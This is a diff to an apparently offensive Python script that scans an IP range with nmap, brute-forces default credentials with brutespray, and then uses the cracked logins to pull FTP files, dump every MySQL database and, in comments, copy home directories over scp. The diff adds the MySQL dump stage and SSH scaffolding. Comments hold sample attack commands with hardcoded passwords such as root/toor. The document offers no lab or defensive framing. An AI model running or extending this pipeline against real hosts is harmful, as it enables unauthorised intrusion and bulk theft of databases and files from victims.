@@ -4,6 +4,9 @@ import time
 import re
 from pathlib import Path
 
+#mysqldump --user=root --password=toor --host=192.168.111.145 --protocol=tcp --port=3306 --all-databases > dump.sql
+
+
 def _parse_args():
 	parser = argparse.ArgumentParser(description='main.py')
 	parser.add_argument('ip', type=str, help='IP range to search for defaults')
@@ -13,7 +16,7 @@ def _parse_args():
 	return args
 
 def clean_up():
-	cmd = "rm -f output.gnmap; rm -rf brutespray-output; rm -rf ftp; " 
+	cmd = "rm -f output.gnmap; rm -rf brutespray-output; rm -rf ftp; rm -rf mysql; " 
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	# following line runs so we wait until we're done cleaning up
 	out, err = proc.communicate()
@@ -31,7 +34,6 @@ def run_brutespray(threads: int):
 	# print(brute_out.decode('utf-8'))
 
 def get_ftp_files(ip, username, password):
-	# this probably doesn't work yet
 	ftp_cd = "cd ftp; "
 	mkdir = "mkdir " + username + "; "
 	cd = "cd " + username + "; "
@@ -40,19 +42,32 @@ def get_ftp_files(ip, username, password):
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 	if err is not None:
-		print("\tFailed to grab all files")
+		print("\tF\tailed to grab all files")
 
 def get_mysql_files(ip, username, password):
-	# this probably doesn't work yet
-	mkdir = "mkdir " + username + ":" + ip + ";"
-	mysqldump = "mysqldump -h " + ip + " -u" + username + " -p " + password + " --all-databases > " + username + ":" + ip + "/dump.sql"
-	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
+	mkdir = "cd mysql; mkdir " + username + ":" + ip + ";"
+	# make dump file
+	touch = "touch " + username + ":" + ip + "/dump.sql;"
+	mysqldump = "mysqldump --host=" + ip + " --user=" + username + " --password=" + password + " --protocol=tcp --port=3306 --all-databases > " + username + ":" + ip + "/dump.sql;"
+
+	cmd = mkdir + touch + mysqldump
+	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
-	# if err not None:
-	# 	print("files grabbed from",username,":",password,"@",ip)
+	if err is not None:
+		print("\t\tfailed to dump database")
 
 def make_ftp_folder():
 	cmd = "mkdir ftp"
+	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+	out, err = proc.communicate()
+
+def make_ssh_folder():
+	cmd = "mkdir ssh"
+	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+	out, err = proc.communicate()
+
+def make_mysql_folder():
+	cmd = "mkdir mysql"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
 
@@ -71,9 +86,14 @@ if __name__ == "__main__":
 	# run nmap
 	run_nmap(args.ip)
 	print("==== nmap done")
+	# run brutespray
 	run_brutespray(args.threads)
 	print("==== brutespray done")
+	# get files from brutespray
 	ftp_file = Path("./brutespray-output/21-ftp-success.txt")
+	ssh_file = Path("./brutespray-output/22-ssh-success.txt")
+	mysql_file = Path("./brutespray-output/3306-mysql-success.txt")
+	# grab files from ftp servers
 	if ftp_file.is_file():
 		print("==== retreiving info from ftp servers")
 		make_ftp_folder()
@@ -84,6 +104,28 @@ if __name__ == "__main__":
 				if match is not None:
 					print("\tgrabbing ftp files from " + str(match.group(2)))
 					get_ftp_files(match.group(1), match.group(2), match.group(3))
+	# dump mysql database
+	if mysql_file.is_file():
+		print("==== retreiving info from mysql servers")
+		make_mysql_folder()
+		with open("./brutespray-output/3306-mysql-success.txt", "r") as f:
+			for line in f:
+				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
+				match = regex.search(line)
+				if match is not None:
+					print("\tgrabbing mysql dump from " + str(match.group(2)))
+					get_mysql_files(match.group(1), match.group(2), match.group(3))
+	# get scp files
+	if ssh_file.is_file():
+		print("==== retreiving info from ssh servers")
+		make_ssh_folder()
+		with open("./brutespray-output/22-ssh-success.txt", "r") as f:
+			for line in f:
+				regex = re.compile(r"Host: (.+) User: (.+) Password: (.+) ")
+				match = regex.search(line)
+				if match is not None:
+					print("\tgrabbing scp files from " + str(match.group(2)))
+					# get_ssh_files(match.group(1), match.group(2), match.group(3))
 
 # maybe use this vvv for ssh
 # sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
